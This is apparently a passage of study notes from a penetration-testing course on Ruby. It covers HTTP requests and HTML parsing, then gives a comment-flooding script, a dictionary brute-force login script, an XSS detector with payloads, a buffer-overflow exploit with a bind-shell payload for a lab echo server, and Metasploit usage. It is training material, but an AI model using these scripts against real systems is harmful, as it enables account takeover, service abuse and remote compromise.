HTTP/1.0\\r\\n\\r\\n\" s.print(request)  response = s.read # Output: is the http response   We can split headers and body to analyze them separately:  headers,body = response.split(\"\\r\\n\\r\\n\") headers # Output: of headers  body # Output:  of body      We can try to send a misconfigured request   like GE instead of GET   // method not implemented   this strategy may be useful to detect if the server is vulnerable to misconfigured packet attacks   Net::HTTP library  → http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html   We can use Net::HTTP class in different ways. we can use its class methods or its instances to achieve the same result:  require 'net/http' response = Net::HTTP.get(\"localhost\",\"/\") print response // we get the output of body   Open-uri library  → http://ruby-doc.org/stdlib-1.9.3/libdoc/open-uri/rdoc/OpenURI.html   To get the same body output:  require('open-uri') open('http://localhost/') do |http|   puts http.read end   Usually open-uri is used when u have to retrieve the body response from a webserver quickly.   URI object     URI is a module providing classes to handle Uniform Resource Identifiers. its used to encapsulate an URL (URL are a subset of URI)   → http://www.ruby-doc.org/stdlib-1.9.3/libdoc/uri/rdoc/URI.html   lhost_url = URI(\"http://localhost\") // now we can use 'lhost_url' with 'open-uri' open(lhost_url) do |http| puts http.read end   We can also use lhost_url with Net::HTTP:  puts Net::HTTP.get(lhost_url)   Net::HTTP class and instances   → http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#method-c-get   GET     The first verb we want to analyze is ‘GET’   we will take about handlers, parameters and so on.   Net::HTTP get      we have seen that the Net::HTTP get class method can be used to obtain the body portion of the HTTP response from a target as a string.   It sends a GET request to the target which can be specified using:  an URI object parameter host, path and port parameters   Example:  resp = Net::HTTP.get(URI(\"http://www.elearnsecurity.com\")) # we obtain the GET response body in string format   To print the response body directly to stdout we use get_print:  Net::HTTP.get_print(URI(\"http://www.elearnsecurity.com\"))   We can avoid using the URI object in favor of the host and the path parameters:  resp = Net::HTTP.get(\"www.elearnsecurity.com\",\"/\")   Example of get_print with host and path parameters:  Net::HTTP.get_print(\"www.example.com\",\"/index.html\")      we can use :: or . to call a class method   Example:  Net::HTTP::get_print(URI(\"http://localhost/\")) Net::HTTP.get_print(URI(\"http://localhost/\"))   Net::HTTP get_response     In this case, we do not have a string as a result.   We have an HTTPResponse object that encapsulates the HTTP response (the entire response, not only the body):  res_obj = Net::HTTP.get_response(URI(\"http://localhost/\"))   HttpResponse object      this class wraps the response header and the response body together.   Its the superclass of the real response object returned by get_response:  res_obj = Net::HTTP.get_response(URI(\"http://localhost/\"))   →  http://www.ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#class-Net::HTTP-label-HTTP+Response+Classes   Status:  res_obj.code # Output: \"200\" res_obj.message # Output: \"OK\" res_obj.class.name # Output: \"Net::HTTPOK\"    Headers: To get the hash of the headers:  res_obj.to_hash   We can also use each and each_header:  res_obj.each { |key,value| print key,\":  \",value,\"\\n\"}   To obtain a particular header:  res_obj[\"content-type\"] # Output: \"text/html\"  res_obj[\"server\"] # Output: \"Microsoft-IIS/7.5\"      with the headers we can get information about the server For example, but sometimes web security experts change this header value (with fake ones) in order to hide the real server software and version.   Body:  print res_obj.body   Response Object types  If a resource does not exist, we have a 404 and an HTTPNotFound subclass object:  res_obj.class.name # Output: \"Net::HTTPNotFound\"  res_obj.code # Output: \"404\"   If the requested resource has been permanently moved then we have a 301 code and an HTTPMovedPermanently subclass object:  res_obj.class.name # Output: \"Net::HTTPMovedPermanently\"  res_obj.code # Output: \"301\"   In the moved permanently response, the location header specifies where to find the resource:  res_obj['location']   Parameters  GET requests can have parameters too. The portion of URL that contains data parameters is called query string.   → https://hack.me/      this project allows u to start a vulnerable web app where u can test your script without violating any laws   it looks like hack.me is offline, donc je suis perdu   URL encapsulation  First perform a GET using the entire URL containing the query string:  target = 'http://&lt;full url&gt;' res = Net::HTTP.get(URI(target))   Check the res with the response we expect:  res =~/You have searched For: hello/ # Output: 2057 # the string is at position 2057   Dynamic parameters     A URI instance can encapsulate an entire URL string. we can retrieve and set all of the URL fields by using the getter and setter provided by the URI class.   → moreover: http://www.ruby-doc.org/stdlib-2.1.0/libdoc/uri/rdoc/URI.html   url = URI(target) url.host # 's20570-101060-xjo.tarentum.hack.me' url.path # '/search.php'   Since the target URL does not contain a query string,  the URL object returns nil using the query getter:  url.query # Output: nil      Query method is a setter too.   We can create them by using a simple hash (params) and then we can use the encode_www_form utility method to create the correct query string:  params = {:find=&gt;\"hello\",:searching=&gt;\"yes\"} url.query = URI.encode_www_form(params) # Output: \"find=hello&amp;searching=yes\"   Now we can perform the *GET request using Net::HTTP get (open-uri can be used too):  res = Net::HTTP.get(url)  res =~/You have searched For: hello/ # Output: '2057'   Net::HTTP instances  → http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html   First create a Net::HTTP instance and specify the target address:  http = Net::HTTP.new(\"www.elearnsecurity.com\")   Using GET instance method  We have to call it by specifying the resource path we want to request as an argument:  res = http.get(\"/\") # in this example we request the home page   Using Http:Get request object  The net/http library provides a class For HTTP requests. its full name is Net::HttpRequest, and like HttpResponse, it wraps the request header and the request path together.      This class cannot be used directly; u have to choose one of its subclasses: Net::HTTP::(Get, Post, Head)   → http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#method-i-request      according with the references, u can use its subclasses instances only by using the request method of Net::HTTP instances.  // the path of the server resource we want   The Net::Http::Get instance is a subclass of the HttpRequest designed to perform Get requests:  http = Net::HTTP.new(\"www.elearnsecurity.com\") req = Net::HTTP::Get.new(\"/\") # after having both Net::HTTP and Net::HTTP:GET instances, we can use the request method. res = http.request(req)   URI and parameters  If u use the Net::HTTP instance to perform GET requests, u can use URI objects as parameters too.   Request Headers     How to handle request headers   to set our custom header, we need to use Net::HTTP instances   Using get instance method  How to change the default value of the User-Agent request header:  http = Net::HTTP.new(\"www.elearnsecurity.com\") headers = {\"user-agent\" =&gt; \"Custom user agent\"} http.get(\"/\",headers) # we can confirm with Wireshark, that our current User-Agent contains the value that we gave = \"Custom user agent\"   using Http.Get request object  → http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTPHeader.html   HttpRequest instances wraps the request header (Net::HTTPHeader) and the request path together:  http = Net::HTTP.new(\"www.elearnsecurity.com\") req = Net::HTTP::Get.new(\"/\") req['user-agent'] //only outputs the current user-agent req['user-agent'] = \"Another custom user-agent\" # modify and print the user-agent  http.request(req) # we can check with wireshark again that our new user-agent is set correctly   Working with Open-uri  GET requests can be performed more easily by using open-uri library      Open-uri supports only the GET method but there is gems (such as rest-open-uri) that extend its functionality to others verbs (like POST)   open method  It returns a Tempfile object that encapsulates the response:  resp = open(\"http://www.elearnsecurity.com\") resp.class.name # Output: \"Tempfile\"   If u want the response body, u can use line unumerators:  resp.each_line { |line| puts line }   Response headers are treated as meta information and are available using the meta attribute:  resp.meta # headers output   U can also use open with a block methodology. the block variable (resp) is the Tempfile created by the open:  open(\"http://www.elearnsecurity.com\"){ |resp| puts resp.meta }   request headers  With open we can specify request headers as an optional hash argument:  open(\"http://www.elearnsecurity.com\",{\"User-Agent\"=&gt;\"custom header\"})   Setting new header:  open(\"http://www.elearnsecurity.com\",\"User-Agent\"=&gt;\"Test\",\"New-Header\"=&gt;\"some value\")   POST   Using Net::HTTP post_form  → http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html#method-c-post_form   The target address is the login.php resource while form parameters are user and pass:  url = URI(\"&lt;url of the target&gt;\") params = {\"user\"=&gt;\"els\",\"pass\"=&gt;\"els\"} res = Net::HTTP.post_form(url,params)   Sessions and cookies  res['location']      myaccount.php its the location responder header with the destination address if the login succeds    To see if the login using our POST succeeded. we look at the set-cookie:  res.to_hash   Now we send a GET request to the myaccount.php target using a proper cookie header:  url = \"&lt;url/myaccount.php&gt;\" logged = open(url,\"cookie\"=&gt;res['set-cookie'])  logged.each_line { |line| print line } # to print the response   Using Http::Post request object  First thing is to create an Net::HTTP instance:  target = \"&lt;url&gt;\" http = Net::HTTP.new(target)   Now we create a Net::HTTP::POST instance:  req = Net::HTTP::Post.new(\"/login.php\")   We have to set the POST form values, in this case els:els  req.set_form_data(\"user\"=&gt;\"els\",\"pass\"=&gt;\"els\")   We now have to send the request by using the method of the Net::HTTP instance  res = http.request(req) # we received a 'moved temporarly' response   To print the headers, we can see the set-cookie header with the SESSION-ID which identifies the logged session:  res.to_hash      we can use this SESSION-ID as a request Cookie to perform logged requests    Request Headers  U can set your custom request headers with POST requests      in the logged page we can write comments        we can run the same operation in Ruby       the comments are allowed only For logged in users   this implicitly means that your browser sends a cookie (as an header) that identifies your authenticated session during the POST request        therefore, we need to set the cookie header with a proper SESSION-ID value.       look at the source code to identify the form action of the page and field names   in this case, action=’sendmsg_confirmation.php’, name, comment, cat   We have a res variable containing the login response with the SESSION-ID in set-cookie header:  res.to_hash   Using post instance method  To use post, we need a Net::Http instance; the target resource address too:  target = \"&lt;url&gt;\" http = Net::HTTP.new(target)   The form we want to send if the following:  param = {\"name\"=&gt;\"hello\",\"comment\"=&gt;\"from ruby\",\"cat\"=&gt;\"1\"} # the cat is if of the category   Our post request must contain a cookie header with a valid logged SESSION-ID:  header = {\"cookie\"=&gt;res['set-cookie']}      now we can perform the POST request   it requires an encoded form data while the destination path is the action address seen before in the source code.   enc_param = URI.encode_www_form(param) http.post(\"/sendmsg_confirmation.php\",enc_param,header)  # we can go to the page and check if our commentary is there   Using Http::Post request object  target = \"&lt;url&gt;\" http = Net::HTTP.new(target) req = Net::HTTP::Post.new(\"/sendmsg_confirmation.php\") req.set_form_data({\"name\"=&gt;\"hello\",\"comment\"=&gt;\"again from ruby\",\"cat\"=&gt;\"1\"}) req['cookie']=res['set-cookie'] http.request(req)   Example: Post Flooding  We want to write a post flooding script that sends subsequent POST request to the target in order to full the programs page (program.php) with a lot of undesired comments.      this is possible because there are no security mechanisms implemented in the web app (such as captcha). Therefore subsequent request can be automated using a script.   our script takes the target address, an user name, a password and the number of comments we want to send as arguments. then the script performs the login flow and finally it uses the SESSION-ID received to send the subsequent POST comment requests.   Usage:  ruby post_flooding.rb &lt;target url&gt; &lt;login&gt; &lt;password&gt; &lt;number of comments&gt;   First identify the parameters and create http instance:  require 'net/http' Target_URI = URI(ARGV[0]) Username = ARGV[1] Password = ARGV[2] Max_Comments = ARGV[3].to_i  http = Net::HTTP.new(Target_URI.hostname)   Perform the login process using Username and Password in order to obtain the session id from the set-cookie response header:  login_param = URI.encode_www_form({\"user\"=&gt;Username, \"pass\"=&gt;Password}) login_res = http.post(\"/login.php\",login_param) session_id = login_res['set-cookie']   Then the flooding part. we have to use the SESSION-ID received from the login process as a cookie header to be able to post any comment:  flood_parameters = URI.encode_www_form({\"name\"=&gt;\"FLOOD\",\"comment\"=&gt;\"FROM RUBY\",\"cat\"=&gt;\"1\"}) (1..Max_Comments).each{    http.post(\"/sendmsg_confirmation.php\",flood_parameters,\"cookie\"=&gt;session_id }      we used our own credentials, thats now ideal  we can try to discover someone elses credentials in order to not expose our credentials    Persistent Connections  If u have to exchange a lot of information with the server (For example a multi chunk file download), its better to have a unique TCP connection.      the HTTP 1.1 protocol allows u to maintain the connection opened For subsequent request.   using the start method, we can open a unique TCP stream (a unique connection and a unique handshake)   → moreover: http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html      Brute form login    Response identification  When the login succeeds, the server sends a moved temporarly response that points to myaccount.php. The server also sets a cookie with the SESSION-ID For the created login session:  url = URI(\"&lt;target login url&gt;\") params = {\"user\"=&gt;\"els\",\"pass\"=&gt;\"els\"} res = Net::HTTP.post_form(url,params) res['location'] res['set-cookie']      if we provide wrong credentials, there is no set-cookie header and the location is the same url so we can use these 2 info, to see if the login succeeds or not.    Find a UserName  Scrap through the web page to find valid usernames      in this case there are logins in the comments   Dictionary attack  The script sequentially tests each password against the same UserName and if one of these is correct, it prints it to stdout.   Usage:   → time ruby dictionary_login.rb &lt;url target&gt; &lt;username&gt; &lt;dictionary file&gt;  require 'net/http'  Target = ARGV[0] User = ARGV[1] Password_file = ARGV[2]  url = URI(Target) params = { \"user\" =&gt; User } http = Net::HTTP.start(url.hostname) req = Net::HTTP::Post.new(url.request_uri)  File.open(Password_file, 'r') do |file|   real_pwd = file.each do |pwd|     params['pass'] = pwd.chomp # Use `chomp` to remove newline characters     req.set_form_data(params)     res = http.request(req)     break pwd.chomp if res['location'] == 'myaccount.php' &amp;&amp; res['set-cookie']   end    if real_pwd.is_a? String     puts \"\\nPassword for '#{User}' is: #{real_pwd}\"   else     puts \"\\nPassword not found for '#{User}'.\"   end end  http.finish # Corrected the method name    Using a string generator  If the target chooses a strong password, an attacker may not be able to discover it in a short time   However its a good exercise to use Ruby to generate all of the string ofa particular character input space to use in a real bruteforce scenario.   Input parameters:  Input_space = 'a'..'z' Min_length = 1 Max_length = 3   Generates all of the strings of a specific size using the input_space characters:  def genst(st,post,&amp;block)   return block.call(st) if pos&lt;=0   Input_space.each { |x| genst(st+x,pos-1,&amp;block) } end   Start from min_length up to max_length generates all of the strings of a specific size using the previous genst:  def genallpwd(&amp;block)   (Min_length..Max_length).each { |l| genst(\"\",l,&amp;block)} end   Call the genallpwd method and allows us to specify what the task is to do when a new string is generated.   In this case we want to print:  genallpwd{ |pwd| puts pwd}      we can change the size For example to 4..10 and also change the input_space to every alphanumeric string    Input_space = ('A'..'Z').to_a+('a'..'z').to_a+('0'..'9').to_a Min_length = 4 Max_length = 10      we can set the target url and username as parameters and try to break into the account with the generates characters it takes some time to use this technique, even if its a short password    HTTPS  Net::HTTP allows us to handle also https connections. we only need to change the connection establishment, the rest is the same      create an SSL connection with Net::HTTP instance   Specify a correct SSL port (usually 443):  url = URI(\"http://members.elearnsecurity.com\") url.host //the site url.port //443 https = Net::HTTP.new(url.host,url.port)   Set the connection to use SSL:  https.use_ssl = true   Now we can use all of the instance methods previously seen.   For example, a simple GET request to the home page path:  resp = https.get(\"/\")   Another way to handle https connection is by using start method:  https = Net::HTTP.start(url.host,url.port,:use_ssl=&gt;true)   →  moreover = http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html   Redirection  One common usage is For security reasons - the typical HTTP to HTTPS redirection. For example, if er request a website login page using HTTP, we could be automatically redirected to the HTTPS page.      the script will print the redirection chain to the standard output.   usually responses are Moved Permanently 301 or Moved Temporarly 302. in this cases, the location header specifie where the resource can be found.   If we send a GET request, we have the message and the location header:  res = Net::HTTP.get_response(URI(\"http://justcrypt.it\")) res['location'] # Output: 'https://justcryit.com'   We have to follow the request:   url = URI(\"https://justcrypt.it\") resp = Net::HTTP.start(url.host,url.port,:use_ssl=&gt;true) do |https|   https.get(\"/\") end resp['location'] # Output: 'https://justcrypt.it/send'    We have to follow the redirection chain until we receive an HTTPOK response (code 200):  url = URI(\"https://justcrypt.it/send\") resp = Net::HTTP.start(url.host,url.port,:use_ssl=&gt;true) do |https|   https.get(url.path) end # Output: 'HTTPOK 200 OK readbody=true'   Follow the chain  We can make a script to automatically that follows the chain of a given target address   First the function that is able to follow the redirection chain, ans its able to identify both http and https connection type:  require 'net/http'  Target = ARGV[0]  def follow_chain(url, &amp;block)   resp = Net::HTTP.start(url.host, url.port, use_ssl: url.scheme == 'https') do |https|     https.get(url.path)   end   block.call(url, resp)   follow_chain(URI(resp['location']), &amp;block) if resp.is_a? Net::HTTPRedirection end  puts \"Starting from: #{Target}\\n\\n\" follow_chain(URI(Target)) do |url, resp|   case resp   when Net::HTTPRedirection     puts \"Redirection to: #{resp['location']}\"   when Net::HTTPSuccess     puts \"\\nHTTPOK: #{url.to_s}\"   end end     Proxies  It may be useful to use proxies (For example if u want to keep your anonymity)   → list of free available proxies - http://www.freeproxylists.net/      in this example we gonna use proxy 62.68.95.14 on port 8080 - HTTP   Http Proxies   First create a Net::HTTP instance:  proxy_addr = \"62.68.95.14\" proxy_port = 8080 proxy = Net::HTTP.new(\"www.elearnsecurity\", nil,\"proxy_addr,proxy_port\")   Then we can use the methods already seen to perform a request:  res = proxy.get(\"/\") # Output: 'HTTPOK 200'   We can inspect the packets with wireshark:  nslookup www.elearnsecurity.com   Https Proxies  Choose a proxy that supports https connections   Is the same as http, but we have to use SSL:  proxy_addr = \"92.245.170.248\" proxy_port = 8080 target = \"members.elearnsecurity.com\" res = Net::HTTP.start(target, 443,proxy_addr,proxy_port,:use_ssl=&gt;true) do |https|   https.get(\"/\") end  # Output: 'HTTPOK 200 ok'      https proxies use the HTTP CONNECT Tunneling   the Net::HTTP class automatically encapsulate this particular protocol when u request an HTTPS resource using a proxy   → moreover = http://en.wikipedia.org/wiki/HTTP_tunnel#HTTP_CONNECT_Tunneling   Other VERBS   To use other verbs besides get and post, we use a Net::HTTP instance (there are not Net::HTTP class methods to do that)   Options  OPTIONS requests allow u to know the list of VERBs supported by a particular target web resource   Start apache = service apache2 start   Show the verbs available:  http = Net::HTTP.new(\"localhost\") opt = http.options(\"/\") opt.to_hash # in the allow output ['options, get, head, post']   We can obtain the same result using an Net::HTP::Options request object. its a subclass of HttpRequest:  http = Net::HTTP.new(\"localhost\") req = Net::HTTP::Options.new(\"/\") opt = http.request(req) opt.to_hash   Sometimes verbs different from post and get are not allowed. Take google as an example:  opt.class.name # Output: \"Net:HTTPMethodNotAllowed\" // does not allowed the options verb   HEAD  Verb used to request only the resource response headers:  http = Net::HTTP.new(\"localhost\") head = http.head(\"/\") head.to_hash headh.body # Output: nil   U can use the HttpRequest subclass request object Net::HTTP::Head:  http = Net::HTTP.new(\"localhost\") req = Net::HTTP::Head.new(\"/\") head = http.request(req) head.to_hash   Others  Check the references   → http://ruby-doc.org/stdlib-2.1.1/libdoc/net/http/rdoc/Net/HTTP.html   Data Extraction   The extraction of the data depends on the type of response body: HTML, XML, JSON, private format, etc   We will use mainly regular expression or document parsing   Regular Expressions  Whatever the response format is, with regular expression u can extract substrings that match a specific pattern (ignoring the format)   email extraction  If u have to perform a pentest that involves a web app, extracting emails is something that u would do Usage:  ruby email_extr.rb &lt;url target&gt;   The code using open-uri and scan method:  require 'open-uri'  Target = ARGV[0] Email_re = /[-0-9a-zA-Z.+_]+@[-0-9a-zA-Z.+_]+\\.[a-zA-Z]{2,4}/ emails = open(Target) { |res| res.read.scan(Email_re)} emails.each { |email| puts email}      U can also check invisible contents such as comments or hidden elements    Document Parsing  Sometimes is better to parse through the node structure of the document   Nokogiri  → http://nokogiri.org/      Nokogiri is an HTML, SAX, and Reader parser. search documents via XPath or CSS3 selectors.   - Xpath   → http://www.w3.org/TR/xpath/  → https://www.w3schools.com/xml/xpath_intro.asp  - CSS3 selector:  → http://www.w3.org/TR/selectors/  → http://www.w3schools.com/cssref/css_selectors.asp   Installation:  gem install nokogiri   Documentation &amp; tutorials:  - http://nokogiri.org/tutorials   Example: Form Extraction:   Usage:   ruby form_extr.rb &lt;url&gt;  require 'open-uri' require 'nokogiri'  Target = ARGV[0]  # Get the response body from the target resource via open-uri and parse the result HTML document using Nokogiri doc = Nokogiri::HTML(open(Target))  # The xpath method returns an array of Nokogiri nodes doc.xpath(\"//form\").each_with_index do |form, i|   puts \"------- FORM #{i + 1} ---------- \"   puts \"Action: \" + form['action']   puts \"Method: \" + form['method']   puts \"FIELD\"   form.xpath(\".//input\").each do |input|     puts \"Name: #{input['name']} - Type: #{input['type']}\"   end   puts end     Example 2 - Detect XSS reflected:   Some browsers (i.e. chrome) have a built-in reflected xss filter that recognizes common payloads such as:  &lt;script&gt;alert(1)&lt;/script&gt;      the easiest way is to parse the document using Nokogori to search the injected payload to see how it appears in the parsed tree.    w/ interpreter:  require 'open-uri' require 'nokogiri' target = URI(\"&lt;the full url with the &lt;script&gt; alert\")      we can use open-uri and nokogiri to request the target resource using a GET request and to parse the html response body     doc = Nokogiri::HTML(open(target))  If we have a 'script' node in the tree, it means that the browser parses it as a script node too and executes its code: alert(12345) # another strategy is to search the string alert(12345) and check if its contained in a script node # nokogiri treats text as a TextNode that must be contained in some ElementNode # in this case, the ElementNode must be a script node while the TextNode must contains the string 'alert(12345)'      With xpath query, we can search through all of the text nodes in order to find the one that contains the alert   Example:  text()[contains(.,' alert(12345)')]   Text is used to select all the text nodes of the entire html document   The [] brackets are used to extract nodes that satisfies a particular condition   Contains is a xpath function that checks if a particular string contains another string (first argument - second argument)      So For each text = (. point), it tests if cotnains the second argument (alert12345)   We can execute the query to our parsed document using the xpath function:  doc.xpath(\"//text()[contains(.,' alert(12345)')]\")    // the output will be an array of nodes that satisfy our xpath query   We want to test if its parent is a script node:  el = doc.xpath(\"//text()[contains(.,' alert(12345)')]\")  el.first el.first.parent el.first.parent.name el.first.parent.to_html   We can see also the HTML code of the node that contains the injected script:  el.first.parent.parent.to_html # so we can confirm the we have inject a real script that will be executed by any browser   A simple Tool to detect XSS  Usage:  ruby detect_xss.rb &lt;full url&gt; &lt;target parameter&gt;  &lt;div&gt; &lt;?php echo $_GET['param'] ?&gt;&lt;/div&gt; &lt;div&gt; &lt;?php echp htmlspecialchars($_GET['param'],ENT_QUOTES, 'UTF-8') ?&gt; &lt;/div&gt;   // in the first div the script was injected correctly, but in the second one it was filtered.   → ruby detect_xss.rb http://localhost/xss1.php?param=123 param   require 'nokogiri' require 'open-uri' require 'cgi'  Target = URI(ARGV[0]) Parameter = ARGV[1]  XSS_VECTORS = [\"&lt;script&gt; alert(123456)&lt;/script&gt;\"] Testing_Values = [\" alert(123456)\"]  Query = CGI.parse(Target.query)  XSS_VECTORS.zip(Testing_Values).each do |vect, test|   Query[Parameter] = vect   Target.query = URI.encode_www_form(Query)   doc = Nokogiri::HTML(open(Target))    doc.search(\"//text()[contains(.,'#{test}')]\").each do |el|     if el.parent.name == 'script'       puts \"------ Probable XSS found --------\"       puts \"Injection Vector: #{vect}\",\"\\n\"       puts \"FOUND IN THE FOLLOWING CODE\"       puts el.parent.parent.to_html       puts \"------------------------------------------\",\"\\n\"     end   end end    Sometimes the simple &lt;script&gt; does not work, so we need to be more sophisticated  Example:  ' onclick=alert(12345) b='      in case we have a code that does not filter single quotes    Exercises   1 - CMS Detection     The first exercise u could do is to detect if a particular web app uses a CMS   1way - check the response headers of the resources of the webapp in order to find some interesting values (For example X-Powered-By response headers)   2 way - test if the webapp resource URLs follow a particular pattern   2 - Hidden Files     Hidden files detector   sometimes, web devs leave backup or config files in the webapp   common hidden files that can give information are web.config.bak or php.ini.back and so on   the script could read this particular file name from a list (a file For example) and create a GET request to the specific target resource to check if they are available   3 - Indexing &amp; Crawling     develop ur own web crawler or indexing tool   start from the home page of a webapp and list (and download if u are developing a crawler) all of the resources u can find in the web page.   u may have to choose the page selection policy, URL restriction, the strategy to detect if a page has been already crawled etc.   advanced crawlers take into account other problems such as efficiency, faults (timeouts, restricted pages, etc), bandwidth saturation and so on.   4 - Subdomain enumeration     u can use some strategies already used For crawling or hidden files but u can also web search engines (such as google)   Exploitation   ELS Echo Server  The Exploit   ELS Echo Server     its a simple echo server that sends back all the messages that it receives   available at the address 172.16.5.10 port 7707. it runs xp sp3   the service  s = TCPSocket.new \"172.16.5.10\",7707 s.gets # Output: 'els echo server 1.1'  s.puts \"hello world\" s.gets # Output: 'hello world - echo server'   It responds only to the first message because it closes the connection after the response:  s.puts \"a message\" s.gets # Output: 'a message - echo server'  s.puts \"another message\" # Output: Errno::EPIPE: Broken pipe   Bug detection     common attacks require bad programming   in this case, the echo server has a common c++ programming bug, the size of the received data from the user is not checked causing a buffer overflow possibility   Example. lets send a lot of data to the server:  s = TCPSocket.new \"172.16.5.10\",7707 s.gets s.puts \"A\"*100      we do not receive a response, we can assume that the server is crashed       the most common technique to overwrite the Return Address is by using a CALL ESP instruction address (usually located in Kernel32.dll) and then put the malicious code after the local variables space.   This holds because ESP stores the top of the stack and when the RET is executed, the input_copy frame is erased and the top of the stack contains our malicious code executed next by the CALL ESP.   Therefore to correctly exploit the vulnerability, we have to detect where to insert the CALL ESP address and the malicious PAYLOAD.   The Exploit   Identify the Buffer Overflow space  We have to find the position of the return address   Fuzzing     its an incremental technique to detect the correct position of the return address and its mainly used when we cannot debug the vulnerable service.   hackers use fuzzers only if they cannot debug the target application by themselves.   If u have access to the executable, u can use tools such as:  → Immunity Debugger = https://www.immunityinc.com/products/debugger/ → IDA pro = https://www.hex-rays.com/products/ida/ → Ollydbg = http://www.ollydbg.de/   Using a Debugger      lets use Immunity Debugger   set a breaking point on the RETN instruction of the input_copy function. cause we want to check the value of the EIP register after the return.   To detect where the return address location is (offset from the vulnerable buffer), we can use two metasploit tools:  pattern_create.rb pattern_offset.rb /usr/share/metasploit-framework/tools/exploit/   First we create a pattern:  ./pattern_create.rb -l 100 or msf-pattern_create -l 100   Then we send the string to the echo server:  s = TCPSocket.new \"172.16.5.10\",\"7707\" s.gets s.puts \"&lt;the pattern_create string&gt;\"      after the crash we get the value of EIP, in this case 35624134    Now we use the second payload with this value:  ./pattern_offset.rb -q &lt;35624134&gt; 100 or msf-pattern_offset -q &lt;query&gt; # Exact match at offset 44   This means that our script must have 44 character followed by a CALL ESP (or JMP) instruction address   Writing the Payload   Preamble     its the space between the first byte of the vulnerable buffer and the return address. we have seen that its length is 44 bytes   this means that we can insert whatever we want in these bytes since they are not relevant. usually is a common convention to insert NOP operations as preamble (\\x90 is the HEX code For NOP)   In Ruby:  preamble = \"\\x90\"*44   Return address     in Windows XP SP3 we can use 0x7C868667 For a CALL ESP instruction   We need to use Big-Endian, so:  return_address = \"\\x67\\x86\\x86\\x7c\"   The payload     before adding the real malicious payload logic, remember that after the return address, there is space allocated For the arguments passed to call the function.   Does not need to be the exact size, just insert enough NOPs before the real malicious payload:                  nop,nop,nop                         nop                         CALL ESP address       -&gt; EIP register                 nop                         nop                         malicious payload                   → arguments_nop = “\\x90”*10      metasploit helps us with two tools: msfpayload and msfencode   the first one can be used to generate the payload        the second can be used to encode the payload in order to avoid bad characters       Since the vulnerability is caused by a strcpy in a C++ application, we must avoid the \\x00 character (end of line); this is because strcpy will stop the copy if it encounters these bytes   msfpayload windows/exec CMD=calc.exe R | msfencode -b \"\\x00\" -t rb # buf = \"&lt;the generate payload&gt;\"   So, we copy the payload to our ruby script:  calc_payload = &lt;the generate payload&gt;   Then we concatenate all parts previously generated:  exploit = preamble + return_address + arguments_nop + calc_payload   Exploitation     we can add a simple TCP connection to send the payload   Our full script:  preamble = \"\\x90\"*44 return_address = \"\\x67\\x86\\x86\\x7c\" arguments_nop = \"\\x90\"*10 calc_payload = &lt;the generate payload&gt; exploit = preamble + return_address + arguments_nop + calc_payload  host,port = ARGV[0],ARGV[1] require 'socket' TCPSocket.open(host,port) {|s| s.puts exploit}   Usage:  ruby echo_payload.rb 172.16.5.10 7707      On the server machine, a calculator has been executed. The exploit works.    Shell on the victim  Instead of open a calculator, we can open a bind or reverse connection   With metasploit:  windows/shell_bind_tcp      go to the msfconsole   and see the options we can set   msfpayload windows/shell_bind_tcp LPORT=1117 R | msfencode -b \"\\x00\" -t rb # &lt;output of payload&gt;      we can use the same structure of the calc exploitation we just have to change the malicious payload       after sending the payload   we must open a telnet in that port   In kali:  telnet 172.16.5.10 1117 # we have a shell   Metasploit   Introduction  ELS Echo Server  Architecture and Framework  Explore and write the ELS Echo module  Meterpreter scripting   Introduction  Metasploit is a pentest framework designed to quickly use and develop exploits, payloads, encoders and much more.   → http://www.metasploit.com/   ELS Echo Server     in the example our target is a win xp sp3 machine   ip: 172.16.5.10 port:7707   The service  It just echos the messages:  s = TCPSocket.new \"172.16.5.10\",\"7707\" s.gets # Output: gets banner s.puts \"hello world\" s.gets # Output: \"hello world\"   The vulnerability  If we send to many characters the service will crash:  s.puts \"A\"*100 # crashes      Now we want to automate the exploitation phase. This avoids having to write a custom script (or a payload) each time we find an ELS Echo Server.    Exploitation with Metasploit   → run msfconsole  → use exploit/windows/els/echoserv  → info  → check // we can use this command, to see if the target is exploitable  → set PAYLOAD &lt; preferred payload &gt;  → set lhost and lport  → exploit  # to get a meterpreter session   Architecture and Framework   → https://github.com/rapid7/metasploit-framework/wiki#metasploit-development   Metasploit framework Architecture                          libraries       interfaces                                 tools &gt;       Rex       Console                                         MSF CORE       CLI                                 plugins &gt;       MSF BASE       &lt; WEB                                 modules                                                 payloads       exploits       encoders       post-modules       auxiliary           Path in kali:  /usr/share/metasploit-framework   Path useful For local user modules and plugins:  ~/.msf4   Interfaces   Msfconsole     The most used one. its a complex interface and a shell command too.   with the msfconsole -h option we can see usage information   Msfcli     its the command-line interface into the metasploit framework.   u can use to launch exploits or handler quickly   its the best choice if u already know what u have to do and u do not want to use the msfconsole   using msfcli -h option we can see usage information   Example:  msfcli exploit/windows/els/echoserv RHOST=172.16.5.10 E // E = execute  // rport,target and payloads options are taken as default   Web interface  Usage:   → service metasploit start  → its in localhost:3790  → to use it, a registration is required but its free and quick      u can build your own projects and perform the same things u can do with msfconsole   Usage example:  search modules &gt; echoserv      now we can set the options through the interface   after running, we get a meterpreter session in the sessions tab   We have various features to interact with the session:  - // collect system data, virtual desktop, access filesystem, search filesystem, command shell, create proxy pivot, create VPN pivot, terminate session      it may be useful if u have to automate a lot of tasks   however some features are not available in the free community version (like auto-exploitation)   Others  → /usr/share/metasploit-framework &gt; ls      then check the options with -h to list more information   Example:  msfvenom -h   Libraries  → /usr/share/metasploit-framework/lib &gt; ls   → moreover the libraries: https://github.com/rapid7/metasploit-framework/blob/master/documentation/developers_guide.pdf      u can explore its modules, classes, utilities etc to use its libraries in your scripts without using any Metasploit interface        https://github.com/rapid7/metasploit-framework/wiki#metasploit-development       Metasploit provides very good API documentation that shows u the code of each method u want to know   → https://rapid7.github.io/metasploit-framework/api/   Rex library     Ruby extension library is the most important of the entire framework   it provides a collection of basic classes and modules useful For almost all of the framework 